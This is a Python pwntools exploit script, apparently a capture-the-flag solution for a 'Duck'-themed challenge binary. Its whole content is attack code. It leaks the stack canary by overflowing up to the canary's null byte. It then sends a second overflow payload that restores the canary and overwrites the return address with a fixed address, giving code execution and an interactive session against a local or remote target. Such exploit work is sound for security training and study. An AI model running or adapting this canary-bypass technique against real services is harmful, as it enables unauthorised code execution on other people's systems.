from pwn import *
import argparse

def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="Exploit script for local or remote target")
    parser.add_argument("--ip", help="Remote IP address of the target")
    parser.add_argument("--port", type=int, help="Remote port of the target")
    parser.add_argument("--local", action="store_true", help="Run the binary locally")
    parser.add_argument("--path", default="./chall", help="Path to the local binary (default: ./chall)")
    return parser.parse_args()

def start_process(args):
    """Launch the binary locally or connect to remote."""
    if args.local:
        context.binary = args.path
        log.info("Running exploit locally")
        return process(args.path)
    else:
        if not args.ip or not args.port:
            log.error("Remote mode requires both --ip and --port.")
            exit(1)
        log.info(f"Connecting remotely to {args.ip}:{args.port}")
        return remote(args.ip, args.port)

def leak_canary(p, offset, marker):
    """Leak the stack canary from the process."""
    payload = b"A" * offset + marker
    p.sendafter(b'> ', payload)
    p.recvuntil(marker)
    leak = p.recvuntil(b', ready to fight the Duck?', drop=True)
    
    canary_partial = leak[:7]
    canary = b'\x00' + canary_partial
    canary_val = u64(canary)
    
    log.success(f"Leaked canary: {hex(canary_val)}")
    return canary_val

def send_final_payload(p, canary, ret_addr):
    """Send the final payload to gain code execution."""
    payload  = b"A" * 88          # Padding up to canary
    payload += p64(canary)        # Valid canary
    payload += p64(0)             # RBP or dummy value
    payload += p64(ret_addr)      # Return address to jump to

    p.sendafter(b'> ', payload)
    p.interactive()

def main():
    args = parse_args()
    p = start_process(args)

    offset_to_canary = 89
    marker = b"Quack Quack "
    canary = leak_canary(p, offset_to_canary, marker)

    ret_address = 0x0040137f  # Replace with your win() / ROP gadget
    send_final_payload(p, canary, ret_address)

if __name__ == "__main__":
    main()
